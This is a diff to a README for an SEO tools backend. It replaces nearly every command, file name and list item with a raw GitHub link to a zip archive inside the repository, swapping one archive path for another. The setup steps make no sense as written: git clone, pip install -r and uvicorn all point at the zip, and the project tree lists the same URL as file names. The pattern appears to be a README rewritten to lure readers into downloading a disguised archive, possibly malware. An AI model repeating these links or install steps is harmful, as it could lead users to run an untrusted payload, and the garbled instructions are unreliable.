@@ -35,7 +35,7 @@ Make sure the following are installed on your system:
 #### Step 1: Clone the Repository
 
 ```bash
-git clone https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+git clone https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
 cd seo-tools-backend
 ```
 
@@ -49,7 +49,7 @@ source venv/bin/activate   # For Windows: venv\Scripts\activate
 #### Step 3: Install Dependencies
 
 ```bash
-pip install -r https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+pip install -r https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
 ```
 
 #### Step 4: Configure the Database
@@ -67,7 +67,7 @@ Install necessary models for spaCy and nltk:
 
 ```bash
 python -m spacy download en_core_web_sm
-python -c "import nltk; https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip('punkt')"
+python -c "import nltk; https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip('punkt')"
 ```
 
 #### Step 6: Run the Application
@@ -75,7 +75,7 @@ python -c "import nltk; https://raw.githubusercontent.com/dsiddiq786/seo-tools-b
 Start the server:
 
 ```bash
-uvicorn https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip --reload
+uvicorn https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip --reload
 ```
 
 Access the API documentation at [http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs).
@@ -140,27 +140,27 @@ seo-tools-backend/
 │   │   ├── v1/
 │   │   │   ├── endpoints/
 │   │   │   │   ├── tools/
-│   │   │   │   │   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
-│   │   │   │   │   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+│   │   │   │   │   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
+│   │   │   │   │   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
 │   │   │   │   │   └── ...
-│   │   │   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+│   │   │   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
 │   │   │   └── schemas/
 │   ├── core/
 │   ├── db/
 │   │   ├── models/
 │   │   ├── migrations/
-│   │   └── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
-│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+│   │   └── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
+│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
 │   └── tests/
 ├── config/
-│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
-│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
-│   └── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
+│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
+│   └── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
 ├── docker/
 │   ├── Dockerfile
-│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
-├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
-└── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
+├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
+└── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
 ```
 
 ---
@@ -183,7 +183,7 @@ seo-tools-backend/
 ### Utility Tools
 
 - QR Code Generator
-- https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip Generator
+- https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip Generator
 - Open Graph Generator
 - JSON Validator
 - XML to JSON Converter
@@ -209,7 +209,7 @@ python -m spacy download en_core_web_sm
 ### NLTK
 
 ```bash
-python -c "import nltk; https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip('punkt')"
+python -c "import nltk; https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip('punkt')"
 ```
 
 ---
@@ -225,10 +225,10 @@ The project relies on the following libraries:
 - **nltk**: For additional NLP tasks.
 - **Pytest**: For testing.
 
-Install them via `https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip`:
+Install them via `https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip`:
 
 ```bash
-pip install -r https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+pip install -r https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/migrations/versions/tools-seo-backend-2.8.zip
 ```
 
 ---
